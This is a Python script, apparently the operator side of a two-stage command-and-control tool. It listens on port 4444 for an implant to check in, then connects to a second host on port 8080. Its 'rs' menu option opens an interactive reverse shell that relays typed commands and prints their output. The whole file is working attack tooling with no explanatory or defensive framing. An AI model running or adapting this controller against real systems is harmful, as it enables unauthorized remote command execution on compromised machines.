import socket
from time import sleep


def valid(message):
    if message == "exit":
        return True
    else:
        return False

def reverseShell(skt):


    skt.settimeout(0.2)
    try:
        print(skt.recv(1024).decode("utf-8"), end="")
    except:
        pass
    skt.settimeout(None)


    while True:

        command = input("")

        skt.sendall((command+"\n").encode("utf-8"))
        sleep(1)

        print("\033[2K", end='\r')
        while True:

            try:
                skt.settimeout(0.1)
                data = skt.recv(4096)
                if not data:
                    break
                if data.decode("utf-8") != (command+"\n"):
                    print(data.decode("utf-8"), end="", flush=True)
            except socket.timeout:
                break

        if command == "exit":
            break

    skt.settimeout(None)



def sendCommand():
    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
    print("[>>>] stage 2")

    PORT = 8080
    SERVER_IP = "10.0.0.14"

    RUN = True


    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        skt.connect((SERVER_IP, PORT))
        print("[*] Connection established")

        response = skt.recv(1024).decode("utf-8")
        print(f"[*] Received {response}")

        while RUN:
            print("[*] Main Menu")

            message = input("Enter your message: ")

            skt.sendall(message.encode("utf-8"))
            print("[*] Sent message")

            if valid(message):
                RUN = False
                skt.close()
            if message == "rs":
                response = skt.recv(1024).decode("utf-8")
                print(f"[*] Received {response}")
                reverseShell(skt)
                print("[*] Back to menu")
    except socket.error as e:
        print(f"[!] Could not connect to server {e}")



def awaitConfirmation():
    # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |

    global conn
    RUN = True
    print("[*] Init stage 1")

    proceed = "2".encode("utf-8")

    sktrec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '10.0.0.8'
    port = 4444
    sktrec.bind((host, port))
    try:
        print("[*] Waiting for connection")
        sktrec.listen(1)
        while RUN:
            conn, addr = sktrec.accept()
            print(f"[*] Connection established with {addr}")

            message = conn.recv(1024).decode("utf-8") #
            print(f"[>] Received {message}")
            command = input("[&] Enter command: ")
            conn.sendall(command.encode("utf-8")) #
            if command == "1":
                message = conn.recv(1024).decode("utf-8")
                if message == "proceeding":
                    RUN = False


        conn.close()
    except socket.error as e:
        print(f"[!] Could not connect to server {e}")
    finally:
        sktrec.close()


awaitConfirmation()
sendCommand()



